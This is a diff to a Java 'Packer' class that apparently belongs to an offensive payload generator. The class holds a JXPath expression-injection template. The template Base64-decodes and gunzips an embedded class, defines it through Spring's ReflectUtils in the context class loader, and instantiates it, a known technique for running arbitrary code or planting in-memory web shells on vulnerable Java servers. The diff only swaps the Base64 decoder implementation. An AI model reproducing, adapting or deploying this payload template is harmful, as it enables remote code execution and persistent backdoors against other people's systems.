@@ -11,7 +11,7 @@ import static com.reajason.javaweb.packer.spel.SpELSpringGzipJDK17Packer.assertC
  * @since 2024/12/13
  */
 public class JXPathSpringGzipJDK17Packer implements Packer {
-    String template = "newInstance(org.springframework.cglib.core.ReflectUtils.defineClass('{{className}}',org.springframework.util.StreamUtils.copyToByteArray(java.util.zip.GZIPInputStream.new(java.io.ByteArrayInputStream.new(org.springframework.util.Base64Utils.decodeFromString('{{base64Str}}')))),getContextClassLoader(java.lang.Thread.currentThread()),getProtectionDomain(java.lang.Class.forName('org.springframework.expression.ExpressionParser')),java.lang.Class.forName('org.springframework.expression.ExpressionParser')))";
+    String template = "newInstance(org.springframework.cglib.core.ReflectUtils.defineClass('{{className}}',org.springframework.util.StreamUtils.copyToByteArray(java.util.zip.GZIPInputStream.new(java.io.ByteArrayInputStream.new(decode(java.util.Base64.getDecoder(), ('{{base64Str}}'))))),getContextClassLoader(java.lang.Thread.currentThread()),getProtectionDomain(java.lang.Class.forName('org.springframework.expression.ExpressionParser')),java.lang.Class.forName('org.springframework.expression.ExpressionParser')))";
 
     @Override
     public String pack(ClassPackerConfig config) {
